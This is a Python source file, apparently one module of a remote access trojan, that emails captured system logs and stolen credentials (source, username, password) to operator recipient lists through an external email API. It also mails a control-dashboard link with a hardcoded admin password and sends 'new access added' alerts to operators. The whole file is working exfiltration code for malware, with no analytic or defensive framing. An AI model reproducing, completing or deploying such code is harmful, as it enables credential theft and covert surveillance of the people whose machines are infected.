"""
RAT Email Sender Module
Sends captured logs and credentials via SendLib API

Based on SendLib API: https://sendlib.samueltuoyo.com/docs/send
"""

import requests
import json
import base64
from datetime import datetime
from .config import Config
from .database import get_recipients, mark_logs_sent, mark_credentials_sent, get_credentials

class EmailSender:
    """Sends emails via SendLib API"""
    
    def __init__(self, config=None):
        self.config = config or Config()
        self.api_key = self.config.SENDLIB_API_KEY
        self.api_url = f"{self.config.SENDLIB_URL}/api/send"
        self.sender = self.config.SENDER_EMAIL
        
    def _send_email(self, to, subject, html_content=None, text_content=None):
        """Send a single email via SendLib API
        
        Args:
            to: Recipient email address
            subject: Email subject
            html_content: HTML body content (string)
            text_content: Plain text body content (string)
        """
        try:
            # Build payload according to SendLib API spec
            payload = {
                'from': self.sender,
                'to': to,
                'subject': subject
            }
            
            # Add html content if provided
            if html_content:
                payload['html'] = str(html_content)
            
            # Add text content if provided (fallback for plain text clients)
            if text_content:
                payload['text'] = str(text_content)
            
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            response = requests.post(
                self.api_url,
                headers=headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                print(f"[+] Email sent successfully to {to}")
                return True
            else:
                print(f"[-] Failed to send email to {to}: HTTP {response.status_code}")
                print(f"    Response: {response.text[:200]}")
                return False
                
        except requests.exceptions.Timeout:
            print(f"[-] Timeout sending email to {to}")
            return False
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error sending email to {to}")
            return False
        except Exception as e:
            print(f"[-] Error sending email to {to}: {e}")
            return False
    
    def send_logs(self, log_data):
        """Send captured logs to all recipients"""
        recipients = self.get_active_recipients()
        
        if not recipients:
            print("[-] No recipients to send logs to")
            return False
        
        subject = self.config.EMAIL_SUBJECT_LOGS
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # HTML version
        html_content = f"""
        <html>
        <head>
            <style>
                body {{ font-family: monospace; background: #1a1a2e; color: #eaeaea; padding: 20px; }}
                .header {{ background: #16213e; padding: 10px; border-radius: 5px; margin-bottom: 15px; }}
                .content {{ background: #0f3460; padding: 15px; border-radius: 5px; }}
                pre {{ white-space: pre-wrap; word-wrap: break-word; overflow-x: auto; }}
                .timestamp {{ color: #e94560; font-weight: bold; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h2 style="margin: 0; color: #e94560;">System Log Report</h2>
                <p class="timestamp" style="margin: 5px 0 0 0;">Captured: {timestamp}</p>
            </div>
            <div class="content">
                <pre>{log_data}</pre>
            </div>
        </body>
        </html>
        """
        
        # Plain text version (fallback)
        text_content = f"""System Log Report
Captured: {timestamp}

{log_data}
"""
        
        sent_count = 0
        for recipient in recipients:
            if self._send_email(recipient, subject, html_content, text_content):
                sent_count += 1
        
        # Mark logs as sent in database
        if sent_count > 0:
            mark_logs_sent()
        
        print(f"[+] Logs sent to {sent_count}/{len(recipients)} recipients")
        return sent_count > 0
    
    def send_credentials(self, credentials_data):
        """Send captured credentials to all recipients"""
        recipients = self.get_active_recipients()
        
        if not recipients:
            print("[-] No recipients to send credentials to")
            return False
        
        subject = self.config.EMAIL_SUBJECT_CREDENTIALS
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        html_content = f"""
        <html>
        <head>
            <style>
                body {{ font-family: Arial, sans-serif; background: #1a1a2e; color: #eaeaea; padding: 20px; }}
                .header {{ background: #16213e; padding: 15px; border-radius: 5px; margin-bottom: 15px; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #0f3460; padding: 10px; text-align: left; }}
                th {{ background: #e94560; }}
                tr:nth-child(even) {{ background: #16213e; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h2 style="margin: 0; color: #e94560;">Captured Credentials</h2>
                <p style="margin: 5px 0 0 0; color: #888;">Captured: {timestamp}</p>
            </div>
            <table>
                <tr><th>Source</th><th>Username</th><th>Password</th></tr>
                {credentials_data}
            </table>
        </body>
        </html>
        """
        
        text_content = f"""Captured Credentials
Captured: {timestamp}

{credentials_data}
"""
        
        sent_count = 0
        for recipient in recipients:
            if self._send_email(recipient, subject, html_content, text_content):
                sent_count += 1
        
        if sent_count > 0:
            mark_credentials_sent()
        
        print(f"[+] Credentials sent to {sent_count}/{len(recipients)} recipients")
        return sent_count > 0
    
    def send_dashboard_url(self, url):
        """Send dashboard URL to all recipients"""
        recipients = self.get_active_recipients()
        
        if not recipients:
            print("[-] No recipients to send URL to")
            return False
        
        subject = self.config.EMAIL_SUBJECT_URL
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # HTML version
        html_content = f"""
        <html>
        <head>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }}
                .card {{ background: white; padding: 30px; border-radius: 10px; max-width: 500px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                h1 {{ color: #333; margin-top: 0; }}
                .url-box {{ background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; word-break: break-all; }}
                .url-box a {{ color: #0066cc; text-decoration: none; }}
                .url-box a:hover {{ text-decoration: underline; }}
                .login-info {{ background: #e7f3ff; padding: 15px; border-radius: 5px; margin-top: 20px; }}
                .timestamp {{ color: #666; font-size: 12px; margin-top: 20px; }}
            </style>
        </head>
        <body>
            <div class="card">
                <h1>System Monitor Dashboard</h1>
                <p>Your system monitor dashboard is now available.</p>
                
                <div class="url-box">
                    <strong>Dashboard URL:</strong><br>
                    <a href="{url}">{url}</a>
                </div>
                
                <div class="login-info">
                    <strong>Login Credentials:</strong><br>
                    Username: admin<br>
                    Password: rat_admin_2024
                </div>
                
                <p class="timestamp">Activated: {timestamp}</p>
            </div>
        </body>
        </html>
        """
        
        # Plain text version
        text_content = f"""System Monitor Dashboard

Your system monitor dashboard is now available.

Dashboard URL: {url}

Login Credentials:
Username: admin
Password: rat_admin_2024

Activated: {timestamp}
"""
        
        sent_count = 0
        for recipient in recipients:
            if self._send_email(recipient, subject, html_content, text_content):
                sent_count += 1
        
        print(f"[+] Dashboard URL sent to {sent_count}/{len(recipients)} recipients")
        return sent_count > 0
    
    def send_new_recipient_notification(self, new_email):
        """Notify all recipients when a new recipient is added"""
        recipients = self.get_active_recipients()
        
        if not recipients:
            return False
        
        subject = "RAT - New Access Added"
        
        html_content = f"""
        <html>
        <body style="font-family: Arial, sans-serif; padding: 20px;">
            <div style="background: #f8f9fa; padding: 20px; border-radius: 5px; max-width: 500px;">
                <h2 style="margin-top: 0; color: #333;">New Access Added</h2>
                <p>A new email has been added to receive RAT updates:</p>
                <p style="background: #fff3cd; padding: 10px; border-radius: 3px; font-weight: bold;">{new_email}</p>
                <p style="color: #666;">They will now receive all log captures and notifications.</p>
            </div>
        </body>
        </html>
        """
        
        text_content = f"""New Access Added

A new email has been added to receive RAT updates:

{new_email}

They will now receive all log captures and notifications.
"""
        
        for recipient in recipients:
            if recipient != new_email:
                self._send_email(recipient, subject, html_content, text_content)
    
    def get_active_recipients(self):
        """Get all active email recipients"""
        try:
            recipients = get_recipients(active_only=True)
            if recipients:
                return recipients
        except Exception as e:
            print(f"[-] Error getting recipients from database: {e}")
        
        # Fallback to default recipients
        return self.config.DEFAULT_RECIPIENTS
    
    def send_test_email(self, test_email=None):
        """Send a test email"""
        email = test_email or self.get_active_recipients()[0] if self.get_active_recipients() else None
        
        if not email:
            print("[-] No email address to send test to")
            return False
        
        subject = "System Monitor - Test Email"
        
        html_content = """
        <html>
        <body style="font-family: Arial, sans-serif; padding: 20px;">
            <div style="background: #d4edda; padding: 20px; border-radius: 5px; max-width: 500px; color: #155724;">
                <h2 style="margin-top: 0;">Test Email Successful</h2>
                <p>Your RAT email configuration is working correctly.</p>
            </div>
        </body>
        </html>
        """
        
        text_content = """Test Email Successful

Your RAT email configuration is working correctly.
"""
        
        return self._send_email(email, subject, html_content, text_content)
